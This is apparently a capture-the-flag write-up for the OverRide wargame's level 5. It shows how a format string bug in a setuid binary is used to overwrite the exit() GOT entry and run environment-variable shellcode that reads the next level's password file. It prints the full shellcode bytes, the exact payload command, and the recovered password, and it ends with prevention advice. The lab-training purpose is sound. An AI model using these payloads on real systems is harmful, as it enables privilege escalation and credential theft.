# Level 5 - Format String with GOT Overwrite

## Overview

This level demonstrates a **Format String Vulnerability** exploited to perform a **GOT (Global Offset Table) Overwrite**. The program uses an unprotected `printf()` call with user-controlled input, allowing us to write arbitrary values to arbitrary memory addresses using the `%n` format specifier. By overwriting the GOT entry for `exit()`, we redirect execution to shellcode stored in an environment variable when the program calls `exit()`.

## Vulnerability: Improper Neutralization of Format String [CWE-134](https://cwe.mitre.org/data/definitions/134.html)

### Description

This vulnerability combines format string exploitation with GOT overwrites:

**Format String Vulnerability**:
- `printf(user_input)` allows attackers to control the format string
- `%n` writes the number of bytes printed so far to an address
- `%hn` writes only 2 bytes (short) instead of 4 bytes

**GOT (Global Offset Table)**:
- Contains addresses of dynamically linked functions
- Writable by default in older binaries (no RELRO)
- Overwriting GOT redirects function calls to attacker-controlled addresses

**Exploitation Strategy**:
1. Find GOT entry for `exit()` function
2. Store shellcode in environment variable
3. Use format string to write shellcode address to GOT
4. When `exit()` is called, shellcode executes instead

### Key Characteristics

- **Unprotected printf**: User input passed directly as format string
- **No RELRO**: GOT is writable
- **Predictable addresses**: No ASLR, environment variables at fixed locations
- **Partial writes**: Use `%hn` to write 2 bytes at a time

## Analysis

### Initial Reconnaissance

```bash
level05@OverRide:~$ ls -la
-rwsr-s---+ 1 level06 users 5385 Sep 10  2016 level05
```

The binary runs with `level06` privileges.

### Reverse Engineering

Using GDB to analyze the binary:

```bash
level05@OverRide:~$ gdb ./level05
(gdb) disas main
```

#### Main Function Analysis

Key observations:

1. **Input with fgets** (safe, but modified):
   ```asm
   0x08048475 <+49>:   call   0x8048350 <fgets@plt>
   ```

2. **Uppercase to lowercase conversion loop**:
   ```asm
   0x08048495 <+81>:   cmp    al,0x40         ; Check if > '@' (64)
   0x080484a7 <+99>:   cmp    al,0x5a         ; Check if <= 'Z' (90)
   0x080484bb <+119>:  xor    edx,0x20        ; Toggle case bit
   ```
   This converts uppercase letters (A-Z) to lowercase (a-z).

3. **Vulnerable printf**:
   ```asm
   0x08048504 <+192>:  mov    DWORD PTR [esp],eax
   0x08048507 <+195>:  call   0x8048340 <printf@plt>  ; printf(buffer) - NO FORMAT!
   ```

4. **Call to exit**:
   ```asm
   0x0804850c <+200>:  mov    DWORD PTR [esp],0x0
   0x08048513 <+207>:  call   0x8048370 <exit@plt>
   ```

### Finding the GOT Entry

Check where `exit()` jumps to:

```bash
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:    jmp    DWORD PTR ds:0x80497e0
   0x08048376 <+6>:    push   0x18
   0x0804837b <+11>:   jmp    0x8048330
End of assembler dump.
```

**GOT address for exit()**: `0x080497e0`

This is the address we'll overwrite with our shellcode address.

### Finding Parameter Offset

Test with format string to find where our input appears on the stack:

```bash
level05@OverRide:~$ ./level05
aaaabbbb%10$p%11$p
aaaabbbb0x616161610x62626262
```

**Analysis**:
- `abcd` = `0x64636261` appears at parameter 10
- `abcd` = `0x64636261` appears at parameter 11

We can place addresses at the start of our buffer and reference them with `%10$` and `%11$`.

### Shellcode Setup

Export shellcode to environment variable with a **NOP sled**:

```bash
export SHELLCODE=$(python -c 'print("\x90" * 100 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass")')
```

**Why NOP sled?** Environment variable addresses can shift between different programs. The NOP sled (`\x90` = no operation) creates a larger target. If we jump anywhere in the NOPs, execution slides down to the shellcode.

Find shellcode address using `getenv.c`:

```bash
gcc -m32 getenv.c -o getenv
./getenv SHELLCODE
0xffffd850  # Example address - yours will vary
```

**Important**: Point to the middle of the NOP sled, not the start. Add ~50 bytes to the address returned by getenv:
```
0xffffd850 + 50 = 0xffffd882
```

This accounts for environment differences between getenv and level05.

### Calculating Padding for %hn Writes

**Goal**: Write `0xffffd87c` to address `0x080497e0`

Since the address is too large to write in one operation, we split it:
- **Lower 2 bytes**: `0xd87c` (55420 in decimal)
- **Upper 2 bytes**: `0xffff` (65535 in decimal)

**Strategy**:
1. Write lower bytes to `0x080497e0` using `%10$hn`
2. Write upper bytes to `0x080497e2` using `%11$hn`

**Important**: `%n` counts all characters printed, so:
- First write needs padding to reach 55420
- Second write needs additional padding to reach 65535 total

**Calculating padding**:

```python
# Lower bytes write
lower_value = 0xd87c  # 55420
first_padding = lower_value - 8  # Subtract 8 for the two addresses (4 bytes each)
# first_padding = 55412

# Upper bytes write
upper_value = 0xffff  # 65535
second_padding = upper_value - lower_value
# second_padding = 65535 - 55420 = 10115
```

### Building the Exploit

Format string structure:
```
[addr1][addr2][padding1]%10$hn[padding2]%11$hn
```

Where:
- `addr1` = `0x080497e0` (exit GOT entry - write lower bytes here)
- `addr2` = `0x080497e2` (exit GOT entry + 2 - write upper bytes here)
- `padding1` = 55412 bytes
- `padding2` = 10115 bytes

## Exploitation

### Method 1: Using Python Script (Recommended)

On your local machine, run the exploit script to generate the command:

```bash
python3 exploit.py 0xffffd882
```

This outputs:
```
[*] Shellcode address: 0xffffd882
[*] exit() GOT entry: 0x080497e0
[*] Lower bytes: 0xd882 (55426)
[*] Upper bytes: 0xffff (65535)
[*] First padding: 55418
[*] Second padding: 10109

[*] Copy this command to run in VM:
python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55418d%10$hn" + "%10109d%11$hn")' | ./level05
```

Copy the command and run it in the VM.

### Method 2: Manual Construction

**Important**: Use single quotes to prevent shell `$` expansion!

```bash
python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55418d%10$hn" + "%10109d%11$hn")' | ./level05
```

**Explanation**:
- Single quotes `'...'` prevent shell from expanding `$`
- `\x08\x04\x97\xe0"[::-1]` - GOT address in little-endian
- `\x08\x04\x97\xe2"[::-1]` - GOT address + 2 in little-endian
- `%55418d` - Print 55418 characters (total: 55426 with addresses)
- `%10$hn` - Write 2 bytes to address at parameter 10
- `%10109d` - Print 10109 more characters (total: 65535)
- `%11$hn` - Write 2 bytes to address at parameter 11

### Execution

```bash
level05@OverRide:~$ export SHELLCODE=$(python -c 'print("\x90" * 100 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass")')

level05@OverRide:~$ gcc -m32 getenv.c -o getenv
level05@OverRide:~$ ./getenv SHELLCODE
0xffffd850

level05@OverRide:~$ # Add 50 to point to middle of NOP sled: 0xffffd850 + 50 = 0xffffd882
level05@OverRide:~$ python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55418d%10$hn" + "%10109d%11$hn")' | ./level05
[...lots of padding output...]
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

### Troubleshooting

If you get a segfault:
1. The environment address shifted - try adjusting the offset (±10 bytes)
2. Try different offsets into the NOP sled: +40, +50, +60, +70
3. Re-export SHELLCODE and get a fresh address
4. Ensure you're using single quotes `'...'` not double quotes `"..."`

## Solution

### For Developers - How to Prevent This

1. **NEVER use user input as format string**:
   ```c
   // VULNERABLE
   printf(user_input);

   // SAFE
   printf("%s", user_input);
   ```

2. **Enable RELRO (Relocation Read-Only)**:
   ```bash
   # Partial RELRO (GOT writable)
   gcc -Wl,-z,relro source.c

   # Full RELRO (GOT read-only)
   gcc -Wl,-z,relro,-z,now source.c
   ```

3. **Use FORTIFY_SOURCE**:
   ```bash
   gcc -D_FORTIFY_SOURCE=2 source.c
   ```
   This adds compile-time and runtime checks for format strings.

4. **Enable compiler warnings**:
   ```bash
   gcc -Wformat -Wformat-security source.c
   ```

## Key Takeaways

- Format string vulnerabilities allow arbitrary memory read/write
- GOT overwrites redirect function calls to attacker-controlled code
- `%hn` writes 2 bytes, allowing precise partial overwrites
- Large addresses require multiple writes due to padding limitations
- RELRO protection makes GOT read-only, preventing this attack

## Password

```
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
